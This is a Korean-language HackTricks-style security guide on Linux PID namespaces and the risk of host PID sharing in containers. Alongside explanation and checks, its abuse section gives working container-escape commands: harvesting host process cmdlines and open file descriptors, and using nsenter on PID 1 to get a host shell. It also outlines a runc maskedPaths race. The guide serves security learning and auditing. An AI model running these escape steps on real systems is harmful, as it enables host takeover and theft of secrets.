# PID 네임스페이스

{{#include ../../../../../banners/hacktricks-training.md}}

## 개요

PID namespace는 프로세스의 번호 매김과 어떤 프로세스가 보이는지를 제어합니다. 이 때문에 컨테이너는 실제 머신이 아니더라도 자체 PID 1을 가질 수 있습니다. 네임스페이스 내부에서는 작업 부하가 로컬 프로세스 트리처럼 보이는 것을 관찰합니다. 네임스페이스 외부에서는 호스트가 실제 호스트 PID와 전체 프로세스 현황을 계속 봅니다.

보안 관점에서 PID namespace는 프로세스 가시성이 중요하기 때문에 의미가 있습니다. 작업 부하가 호스트 프로세스를 볼 수 있게 되면 서비스 이름, 명령줄 인수, 프로세스 인수로 전달된 비밀, `/proc`을 통해 얻을 수 있는 환경 유래 상태, 잠재적인 네임스페이스 진입 대상 등을 관찰할 수 있습니다. 또한 단순히 프로세스를 보기만 하는 것이 아니라 적절한 조건에서 시그널을 보내거나 ptrace를 사용하는 등 더 많은 조작이 가능해지면 문제는 훨씬 심각해집니다.

## 동작

새 PID namespace는 자체 내부 프로세스 번호 체계로 시작합니다. 그 안에서 생성된 첫 번째 프로세스는 네임스페이스 관점에서 PID 1이 되며, 이는 고아 자식과 시그널 동작에 대해 init과 유사한 특별한 의미를 가집니다. 이는 init 프로세스, 좀비 수거 (zombie reaping)와 관련된 여러 컨테이너 이상 동작과 왜 작은 init 래퍼가 때때로 컨테이너에서 사용되는지를 설명합니다.

중요한 보안 교훈은 프로세스가 자신의 PID 트리만 보기 때문에 겉보기에는 격리된 것처럼 보일 수 있지만, 그 격리는 의도적으로 제거될 수 있다는 점입니다. Docker는 `--pid=host`를 통해 이를 노출하고, Kubernetes는 `hostPID: true`로 동일한 동작을 합니다. 컨테이너가 호스트 PID 네임스페이스에 합류하면 작업 부하는 호스트 프로세스를 직접 보게 되고, 이후의 많은 공격 경로가 훨씬 현실적인 가능성이 됩니다.

## 실습

PID namespace를 수동으로 생성하려면:
```bash
sudo unshare --pid --fork --mount-proc bash
ps -ef
echo $$
```
쉘은 이제 사적인 프로세스 뷰를 봅니다. `--mount-proc` 플래그는 중요한데, 이는 새로운 PID namespace와 일치하는 procfs 인스턴스를 마운트하여 내부에서 본 프로세스 목록을 일관되게 만들기 때문입니다.

컨테이너 동작을 비교하려면:
```bash
docker run --rm debian:stable-slim ps -ef
docker run --rm --pid=host debian:stable-slim ps -ef | head
```
차이는 즉시 명확하게 드러나므로, 독자들이 시작하기에 좋은 첫 실습이다.

## 런타임 사용

Docker, Podman, containerd, 및 CRI-O의 일반 컨테이너는 각자 고유한 PID namespace를 가진다. Kubernetes Pods도 보통 워크로드가 명시적으로 host PID sharing을 요청하지 않는 한 분리된 PID 뷰를 받는다. LXC/Incus 환경도 동일한 커널 프리미티브에 의존하지만, system-container 사용 사례는 더 복잡한 프로세스 트리를 노출하고 디버깅 단축을 유도할 수 있다.

같은 규칙이 어디에나 적용된다: 런타임이 PID namespace를 분리하지 않기로 선택했다면, 이는 의도적인 컨테이너 경계 축소이다.

## 잘못된 구성

대표적인 잘못된 구성은 host PID sharing이다. 팀들은 종종 디버깅, 모니터링 또는 서비스 관리의 편의를 위해 이를 정당화하지만, 항상 중요한 보안 예외로 취급해야 한다. 컨테이너가 호스트 프로세스에 대해 즉각적인 쓰기 권한이 없더라도, 가시성만으로도 시스템에 대한 많은 정보를 드러낼 수 있다. `CAP_SYS_PTRACE` 같은 권한이나 유용한 procfs 접근이 추가되면 위험은 크게 확대된다.

또 다른 실수는 워크로드가 기본적으로 호스트 프로세스를 kill하거나 ptrace할 수 없으므로 host PID sharing은 무해하다고 가정하는 것이다. 그런 결론은 열거의 가치, namespace-entry 대상의 가용성, 그리고 PID 가시성이 다른 약화된 제어와 결합되는 방식을 무시한다.

## 악용

호스트 PID namespace가 공유되면 공격자는 호스트 프로세스를 조사하고, 프로세스 인자를 수집하고, 흥미로운 서비스를 식별하고, `nsenter`용 후보 PID를 찾거나, 프로세스 가시성을 ptrace 관련 권한과 결합해 호스트나 이웃한 워크로드를 방해할 수 있다. 경우에 따라 적절한 장기 실행 프로세스만 확인해도 공격 계획의 나머지를 재구성하기에 충분하다.

실무적 첫 단계는 항상 호스트 프로세스가 실제로 보이는지 확인하는 것이다:
```bash
readlink /proc/self/ns/pid
ps -ef | head -n 50
ls /proc | grep '^[0-9]' | head -n 20
```
host PIDs가 보이면, process arguments와 namespace-entry targets는 종종 가장 유용한 정보원이 됩니다:
```bash
for p in 1 $(pgrep -n systemd 2>/dev/null) $(pgrep -n dockerd 2>/dev/null); do
echo "PID=$p"
tr '\0' ' ' < /proc/$p/cmdline 2>/dev/null; echo
done
```
만약 `nsenter`가 사용 가능하고 권한이 충분하다면, 보이는 호스트 프로세스를 namespace bridge로 사용할 수 있는지 테스트해보라:
```bash
which nsenter
nsenter -t 1 -m -u -n -i -p sh 2>/dev/null || echo "nsenter blocked"
```
진입이 차단되더라도, host PID 공유는 서비스 배치, 런타임 구성 요소, 그리고 다음 표적이 될 수 있는 권한 있는 프로세스 후보들을 드러내기 때문에 이미 유용하다.

host PID 가시성은 또한 파일 디스크립터 오용을 더 현실적으로 만든다. 만약 특권을 가진 호스트 프로세스나 인접 워크로드가 민감한 파일이나 소켓을 열어두고 있다면, 공격자는 `/proc/<pid>/fd/`를 검사하여 소유권, procfs 마운트 옵션, 그리고 대상 서비스 모델에 따라 해당 핸들을 재사용할 수 있다.
```bash
for fd_dir in /proc/[0-9]*/fd; do
ls -l "$fd_dir" 2>/dev/null | sed "s|^|$fd_dir -> |"
done
grep " /proc " /proc/mounts
```
이 명령들은 `hidepid=1` 또는 `hidepid=2`가 프로세스 간 가시성을 낮추는지, 그리고 열린 비밀 파일, 로그 또는 Unix sockets 같은 명확히 흥미로운 디스크립터들이 전혀 보이는지를 확인해주기 때문에 유용합니다.

### 전체 예시: host PID + `nsenter`

Host PID 공유는 프로세스가 host namespaces에 참여할 충분한 권한을 가질 때 직접적인 host escape가 됩니다:
```bash
ps -ef | head -n 50
capsh --print | grep cap_sys_admin
nsenter -t 1 -m -u -n -i -p /bin/bash
```
명령이 성공하면 컨테이너 프로세스는 이제 호스트의 mount, UTS, network, IPC 및 PID 네임스페이스에서 실행됩니다. 영향은 즉각적인 호스트 침해입니다.

심지어 `nsenter` 자체가 없더라도, 호스트 파일시스템이 마운트되어 있다면 호스트 바이너리를 통해 동일한 결과를 얻을 수 있습니다:
```bash
/host/usr/bin/nsenter -t 1 -m -u -n -i -p /host/bin/bash 2>/dev/null
```
### 최근 런타임 노트

일부 PID 네임스페이스 관련 공격은 전통적인 `hostPID: true` 잘못된 설정이 아니라, 컨테이너 설정 시 procfs 보호가 적용되는 방식의 런타임 구현 버그이다.

#### `maskedPaths`가 호스트 procfs에 대해 경쟁하는 경우

취약한 `runc` 버전에서는, 컨테이너 이미지나 `runc exec` 워크로드를 제어할 수 있는 공격자가 컨테이너 측 `/dev/null`을 `/proc/sys/kernel/core_pattern`과 같은 민감한 procfs 경로를 가리키는 심링크로 교체하여 마스킹 단계와 경쟁할 수 있다. 경쟁이 성공하면, masked-path 바인드 마운트가 잘못된 대상에 마운트되어 호스트 전역의 procfs 설정을 새 컨테이너에 노출할 수 있다.

유용한 검토 명령:
```bash
jq '.linux.maskedPaths' config.json 2>/dev/null
```
이는 결국 직접적인 procfs 노출과 동일한 영향을 미칠 수 있기 때문에 중요합니다: 쓰기 가능한 `core_pattern` 또는 `sysrq-trigger`, 그 뒤에 호스트 코드 실행 또는 서비스 거부가 발생할 수 있습니다.

#### `insject`을 이용한 네임스페이스 주입

`insject`와 같은 Namespace injection 도구는 PID-namespace 상호작용이 프로세스 생성 전에 대상 네임스페이스로 미리 들어가야만 하는 것이 아님을 보여줍니다. 헬퍼는 나중에 attach하여 `setns()`를 사용하고 대상 PID 공간에 대한 가시성을 유지한 채로 실행할 수 있습니다:
```bash
sudo insject -S -p $(pidof containerd-shim) -- bash -lc 'readlink /proc/self/ns/pid && ps -ef'
```
이러한 기법은 주로 고급 디버깅, offensive tooling, 그리고 post-exploitation 워크플로우에서 중요합니다. 런타임이 이미 워크로드를 초기화한 이후에 네임스페이스 컨텍스트를 조인해야 하는 경우가 그렇습니다.

### 관련 FD 오용 패턴

호스트 PID가 보일 때 특히 명확히 지적할 만한 패턴이 두 가지 있습니다. 첫째, privileged process가 `O_CLOEXEC`로 표시되지 않아 민감한 파일 디스크립터를 `execve()` 이후에도 열어 둔 채로 유지할 수 있습니다. 둘째, 서비스는 `SCM_RIGHTS`를 통해 Unix 소켓으로 파일 디스크립터를 전달할 수 있습니다. 두 경우 모두 흥미로운 대상은 더 이상 경로명이 아니라, 낮은 권한의 프로세스가 상속하거나 받을 수 있는 이미 열린 핸들입니다.

컨테이너 작업에서 이것이 중요한 이유는 그 핸들이 `docker.sock`, 권한이 높은 로그, 호스트의 비밀 파일, 또는 경로 자체가 컨테이너 파일시스템에서 직접 접근할 수 없더라도 다른 높은 가치의 객체를 가리킬 수 있기 때문입니다.

## 확인

이 명령들의 목적은 프로세스가 private PID 뷰를 가지는지, 아니면 이미 훨씬 더 넓은 프로세스 영역을 열거할 수 있는지를 판단하는 것입니다.
```bash
readlink /proc/self/ns/pid   # PID namespace identifier
ps -ef | head                # Quick process list sample
ls /proc | head              # Process IDs and procfs layout
```
여기서 흥미로운 점:

- 프로세스 목록에 명백한 호스트 서비스가 포함되어 있다면, 호스트 PID 공유가 이미 활성화되어 있을 가능성이 높다.
- 작은 컨테이너-로컬 트리만 보이는 것이 정상적인 기본 상태이며, `systemd`, `dockerd`, 또는 관련 없는 데몬이 보이는 것은 정상적이지 않다.
- 호스트 PID가 보이기 시작하면, 읽기 전용 프로세스 정보조차도 유용한 정찰 정보가 된다.

호스트 PID 공유로 실행되는 컨테이너를 발견하면, 이를 단순한 외형상의 차이로 보지 마십시오. 이는 워크로드가 관찰하고 잠재적으로 영향을 미칠 수 있는 범위에 큰 변화를 의미합니다.
{{#include ../../../../../banners/hacktricks-training.md}}
